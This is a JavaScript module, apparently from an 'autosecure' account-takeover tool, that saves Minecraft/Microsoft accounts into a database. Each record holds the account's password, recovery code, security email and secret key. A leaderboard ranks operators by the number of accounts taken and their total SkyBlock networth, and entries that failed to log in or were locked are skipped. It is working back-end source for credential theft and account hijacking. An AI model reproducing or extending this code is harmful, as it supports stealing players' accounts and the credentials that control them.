const { queryParams } = require("./db");
const getStats = require("../autosecure/utils/hypixelapi/getStats");
const getuuid = require("../autosecure/utils/hypixelapi/getUUID");
const { autosecurelogs } = require("../autosecure/utils/embeds/autosecurelogs");

async function insertaccount(acc, uid, user, secureifnomc = true, flag) {
    let fixnetworth;
    try {
        const currentEpoch = Math.floor(Date.now() / 1000);
        let stats = null;

        if (flag) {
            let uuid = await getuuid(acc.oldName);
            stats = uuid ? await getStats(acc.oldName) : null;

            await queryParams(
                'INSERT INTO accounts (uid, user_id, username, ownsmc, capes, email, recoverycode, secemail, secretkey, password, stats_id, time) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)',
                [
                    uid,
                    user,
                    acc.oldName,
                    acc.mc,
                    acc.capes,
                    acc.email,
                    acc.recoveryCode,
                    acc.secEmail,
                    acc.secretkey,
                    acc.password,
                    JSON.stringify(stats),
                    currentEpoch
                ]
            );

            await queryParams(
                'INSERT INTO accountsbyuser (user_id, uid, time) VALUES (?, ?, ?)',
                [user, uid, currentEpoch]
            );

            return true;
        }

        if (!acc || Object.values(acc).every(value => value === null)) {
            return false;
        }

        if (!secureifnomc && acc.newName === "No Minecraft!") {
            return true;
        }

        if (["unauthed", "Locked!", "Microsoft services are down!"].includes(acc.email)) {
            return true;
        }

      //  autosecurelogs(null, "secure", user, null, null, null, uid);

        if (acc.email === "Could not login") {
            return true;
        }

        let uuid = await getuuid(acc.oldName);
        stats = uuid ? await getStats(acc.oldName) : null;
        let networth = 0;

        if (stats && stats.skyblock && stats.skyblock.length > 0) {
            let maxNw = 0;
            for (const prof of stats.skyblock) {
                if (prof.networth && prof.networth > maxNw) {
                    maxNw = prof.networth;
                }
            }
            networth = maxNw;
        }

        // console.log(`insert networth ${networth}`);
        fixnetworth = parseInt(networth) || 0;

        await queryParams(
            'INSERT INTO accounts (uid, user_id, username, ownsmc, capes, email, recoverycode, secemail, secretkey, password, stats_id, time) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)',
            [
                uid,
                user,
                acc.oldName,
                acc.mc,
                acc.capes,
                acc.email,
                acc.recoveryCode,
                acc.secEmail,
                acc.secretkey,
                acc.password,
                JSON.stringify(stats),
                currentEpoch
            ]
        );

        let hi = JSON.stringify(stats);
        // console.log(`insert stats: ${hi}`);

        await queryParams(
            'INSERT INTO accountsbyuser (user_id, uid, time) VALUES (?, ?, ?)',
            [user, uid, currentEpoch]
        );

        await queryParams(
            `INSERT INTO leaderboard (user_id, networth, amount) 
             VALUES (?, ?, 1) 
             ON CONFLICT(user_id) 
             DO UPDATE SET amount = amount + 1, networth = networth + ?`,
            [user, fixnetworth, fixnetworth]
        );

        return true;
    } catch (error) {
        console.error("Error inserting account:", error);
        return false;
    }
}

module.exports = insertaccount;
